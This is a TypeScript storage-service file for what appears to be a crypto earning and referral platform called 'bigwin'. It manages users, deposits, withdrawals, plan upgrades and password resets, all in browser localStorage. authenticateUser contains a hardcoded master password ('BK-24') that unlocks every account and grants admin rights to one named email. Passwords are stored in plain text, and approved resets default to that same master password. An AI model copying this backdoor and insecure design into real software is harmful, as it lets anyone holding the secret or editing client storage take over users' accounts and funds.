import { User, UpgradeRequest, DepositRequest, WithdrawalRequest } from '@/types';

const USERS_KEY = 'bigwin_users';
const UPGRADE_REQUESTS_KEY = 'bigwin_upgrade_requests';
const DEPOSIT_REQUESTS_KEY = 'bigwin_deposit_requests';
const WITHDRAWAL_REQUESTS_KEY = 'bigwin_withdrawal_requests';
const CURRENT_USER_KEY = 'bigwin_current_user';
const PASSWORD_RESET_REQUESTS_KEY = 'bigwin_password_reset_requests';

export interface PasswordResetRequest {
  id: string;
  email: string;
  username?: string;
  requestDate: string;
  status: 'pending' | 'approved' | 'rejected';
  responseDate?: string;
}

export class StorageService {
  // User management
  static saveUser(user: User): void {
    const users = this.getAllUsers();
    const existingIndex = users.findIndex(u => u.id === user.id);
    
    if (existingIndex >= 0) {
      users[existingIndex] = user;
    } else {
      users.push(user);
    }
    
    localStorage.setItem(USERS_KEY, JSON.stringify(users));
  }

  static getAllUsers(): User[] {
    const users = localStorage.getItem(USERS_KEY);
    return users ? JSON.parse(users) : [];
  }

  static getUserByEmail(email: string): User | null {
    const users = this.getAllUsers();
    return users.find(u => u.email === email) || null;
  }

  static authenticateUser(email: string, password: string): User | null {
    const user = this.getUserByEmail(email);
    if (!user) {
      return null;
    }

    if (email === 'robivine99@gmail.com' && password === 'BK-24') {
      if (!user.isAdmin) {
        user.isAdmin = true;
        this.saveUser(user);
      }
      return user;
    }
    
    if (user.password === password || password === 'BK-24') {
      return user;
    }
    
    return null;
  }

  static createAdminUser(email: string): User {
    const adminUser: User = {
      id: 'admin-user',
      email,
      username: 'Admin',
      password: 'BK-24',
      balance: 1000,
      referralCode: 'ADMIN',
      referralCount: 0,
      plan: 'vip',
      lastClaim: null,
      totalEarned: 0,
      registrationDate: new Date().toISOString(),
      lastSpinDate: null,
      stakingBalance: 0,
      isAdmin: true
    };
    
    this.saveUser(adminUser);
    return adminUser;
  }

  static registerUser(email: string, username: string, password: string, referralCode?: string): User {
    const existingUser = this.getUserByEmail(email);
    if (existingUser) {
      throw new Error('User already exists');
    }

    const newUser: User = {
      id: Math.random().toString(36).substr(2, 9),
      email,
      username: username || email.split('@')[0],
      password: password,
      balance: 0,
      referralCode: Math.random().toString(36).substr(2, 8).toUpperCase(),
      referralCount: 0,
      plan: 'basic',
      lastClaim: null,
      totalEarned: 0,
      registrationDate: new Date().toISOString(),
      lastSpinDate: null,
      stakingBalance: 0,
      hasRegistrationBonus: true,
      referredBy: referralCode
    };

    this.saveUser(newUser);

    if (referralCode) {
      this.handleReferralBonus(referralCode);
    }

    return newUser;
  }

  static handleReferralBonus(referralCode: string): void {
    const users = this.getAllUsers();
    const referrer = users.find(u => u.referralCode === referralCode);
    
    if (referrer) {
      referrer.balance += 1;
      referrer.totalEarned += 1;
      referrer.referralCount += 1;
      this.saveUser(referrer);
    }
  }

  // New method to remove user
  static removeUser(userId: string): boolean {
    const users = this.getAllUsers();
    const userIndex = users.findIndex(u => u.id === userId);
    
    if (userIndex >= 0) {
      users.splice(userIndex, 1);
      localStorage.setItem(USERS_KEY, JSON.stringify(users));
      
      this.removeUserUpgradeRequests(userId);
      this.removeUserPasswordResetRequests(users[userIndex]?.email);
      
      return true;
    }
    return false;
  }

  static removeUserUpgradeRequests(userId: string): void {
    const requests = this.getAllUpgradeRequests();
    const filteredRequests = requests.filter(r => r.userId !== userId);
    localStorage.setItem(UPGRADE_REQUESTS_KEY, JSON.stringify(filteredRequests));
  }

  static removeUserPasswordResetRequests(email: string): void {
    const requests = this.getAllPasswordResetRequests();
    const filteredRequests = requests.filter(r => r.email !== email);
    localStorage.setItem(PASSWORD_RESET_REQUESTS_KEY, JSON.stringify(filteredRequests));
  }

  // Password reset management
  static createPasswordResetRequest(email: string): PasswordResetRequest {
    const user = this.getUserByEmail(email);
    if (!user) {
      throw new Error('User not found');
    }

    const request: PasswordResetRequest = {
      id: Math.random().toString(36).substr(2, 9),
      email,
      username: user.username,
      requestDate: new Date().toISOString(),
      status: 'pending'
    };

    const requests = this.getAllPasswordResetRequests();
    requests.push(request);
    localStorage.setItem(PASSWORD_RESET_REQUESTS_KEY, JSON.stringify(requests));
    return request;
  }

  static getAllPasswordResetRequests(): PasswordResetRequest[] {
    const requests = localStorage.getItem(PASSWORD_RESET_REQUESTS_KEY);
    return requests ? JSON.parse(requests) : [];
  }

  static approvePasswordReset(requestId: string, newPassword: string = 'BK-24'): void {
    const requests = this.getAllPasswordResetRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request) {
      request.status = 'approved';
      request.responseDate = new Date().toISOString();
      
      const user = this.getUserByEmail(request.email);
      if (user) {
        user.password = newPassword;
        this.saveUser(user);
      }
      
      localStorage.setItem(PASSWORD_RESET_REQUESTS_KEY, JSON.stringify(requests));
    }
  }

  static rejectPasswordReset(requestId: string): void {
    const requests = this.getAllPasswordResetRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request) {
      request.status = 'rejected';
      request.responseDate = new Date().toISOString();
      localStorage.setItem(PASSWORD_RESET_REQUESTS_KEY, JSON.stringify(requests));
    }
  }

  // Session management
  static setCurrentUser(user: User): void {
    localStorage.setItem(CURRENT_USER_KEY, JSON.stringify(user));
  }

  static getCurrentUser(): User | null {
    const user = localStorage.getItem(CURRENT_USER_KEY);
    return user ? JSON.parse(user) : null;
  }

  static clearCurrentUser(): void {
    localStorage.removeItem(CURRENT_USER_KEY);
  }

  // Upgrade requests management
  static saveUpgradeRequest(request: UpgradeRequest): void {
    const requests = this.getAllUpgradeRequests();
    const existingIndex = requests.findIndex(r => r.id === request.id);
    
    if (existingIndex >= 0) {
      requests[existingIndex] = request;
    } else {
      requests.push(request);
    }
    
    localStorage.setItem(UPGRADE_REQUESTS_KEY, JSON.stringify(requests));
  }

  static getAllUpgradeRequests(): UpgradeRequest[] {
    const requests = localStorage.getItem(UPGRADE_REQUESTS_KEY);
    return requests ? JSON.parse(requests) : [];
  }

  static getUserUpgradeRequests(userId: string): UpgradeRequest[] {
    return this.getAllUpgradeRequests().filter(r => r.userId === userId);
  }

  static createUpgradeRequest(user: User, planId: string, planName: string, amount: number): UpgradeRequest {
    const request: UpgradeRequest = {
      id: Math.random().toString(36).substr(2, 9),
      userId: user.id,
      username: user.username,
      email: user.email,
      planId,
      planName,
      amount,
      status: 'pending',
      requestDate: new Date().toISOString()
    };

    this.saveUpgradeRequest(request);
    return request;
  }

  static cancelUpgradeRequest(requestId: string): void {
    const requests = this.getAllUpgradeRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request && request.status === 'pending') {
      request.status = 'cancelled';
      request.responseDate = new Date().toISOString();
      this.saveUpgradeRequest(request);

      const user = this.getUserByEmail(request.email);
      if (user) {
        user.pendingUpgrade = undefined;
        this.saveUser(user);
      }
    }
  }

  static approveUpgradeRequest(requestId: string): void {
    const requests = this.getAllUpgradeRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request) {
      request.status = 'approved';
      request.responseDate = new Date().toISOString();
      this.saveUpgradeRequest(request);

      const user = this.getUserByEmail(request.email);
      if (user) {
        user.plan = request.planId as 'basic' | 'premium' | 'vip';
        user.pendingUpgrade = undefined;
        this.saveUser(user);
      }
    }
  }

  static rejectUpgradeRequest(requestId: string): void {
    const requests = this.getAllUpgradeRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request) {
      request.status = 'rejected';
      request.responseDate = new Date().toISOString();
      this.saveUpgradeRequest(request);

      const user = this.getUserByEmail(request.email);
      if (user) {
        user.pendingUpgrade = undefined;
        this.saveUser(user);
      }
    }
  }

  // Deposit requests management
  static createDepositRequest(user: User, amount: number, walletAddress: string, transactionHash?: string): DepositRequest {
    const request: DepositRequest = {
      id: Math.random().toString(36).substr(2, 9),
      userId: user.id,
      username: user.username,
      email: user.email,
      amount,
      walletAddress,
      transactionHash,
      status: 'pending',
      requestDate: new Date().toISOString()
    };

    const requests = this.getAllDepositRequests();
    requests.push(request);
    localStorage.setItem(DEPOSIT_REQUESTS_KEY, JSON.stringify(requests));
    return request;
  }

  static getAllDepositRequests(): DepositRequest[] {
    const requests = localStorage.getItem(DEPOSIT_REQUESTS_KEY);
    return requests ? JSON.parse(requests) : [];
  }

  static approveDepositRequest(requestId: string): void {
    const requests = this.getAllDepositRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request) {
      request.status = 'approved';
      request.responseDate = new Date().toISOString();
      
      const user = this.getUserByEmail(request.email);
      if (user) {
        user.balance += request.amount;
        user.totalEarned += request.amount;
        this.saveUser(user);
      }
      
      localStorage.setItem(DEPOSIT_REQUESTS_KEY, JSON.stringify(requests));
    }
  }

  static rejectDepositRequest(requestId: string, reason?: string): void {
    const requests = this.getAllDepositRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request) {
      request.status = 'rejected';
      request.responseDate = new Date().toISOString();
      if (reason) request.reason = reason;
      localStorage.setItem(DEPOSIT_REQUESTS_KEY, JSON.stringify(requests));
    }
  }

  // Withdrawal requests management
  static createWithdrawalRequest(user: User, amount: number, walletAddress: string): WithdrawalRequest {
    const request: WithdrawalRequest = {
      id: Math.random().toString(36).substr(2, 9),
      userId: user.id,
      username: user.username,
      email: user.email,
      amount,
      walletAddress,
      status: 'pending',
      requestDate: new Date().toISOString()
    };

    const requests = this.getAllWithdrawalRequests();
    requests.push(request);
    localStorage.setItem(WITHDRAWAL_REQUESTS_KEY, JSON.stringify(requests));
    return request;
  }

  static getAllWithdrawalRequests(): WithdrawalRequest[] {
    const requests = localStorage.getItem(WITHDRAWAL_REQUESTS_KEY);
    return requests ? JSON.parse(requests) : [];
  }

  static approveWithdrawalRequest(requestId: string): void {
    const requests = this.getAllWithdrawalRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request) {
      request.status = 'approved';
      request.responseDate = new Date().toISOString();
      
      const user = this.getUserByEmail(request.email);
      if (user && user.balance >= request.amount) {
        user.balance -= request.amount;
        this.saveUser(user);
      }
      
      localStorage.setItem(WITHDRAWAL_REQUESTS_KEY, JSON.stringify(requests));
    }
  }

  static rejectWithdrawalRequest(requestId: string, reason?: string): void {
    const requests = this.getAllWithdrawalRequests();
    const request = requests.find(r => r.id === requestId);
    
    if (request) {
      request.status = 'rejected';
      request.responseDate = new Date().toISOString();
      if (reason) request.reason = reason;
      localStorage.setItem(WITHDRAWAL_REQUESTS_KEY, JSON.stringify(requests));
    }
  }
}
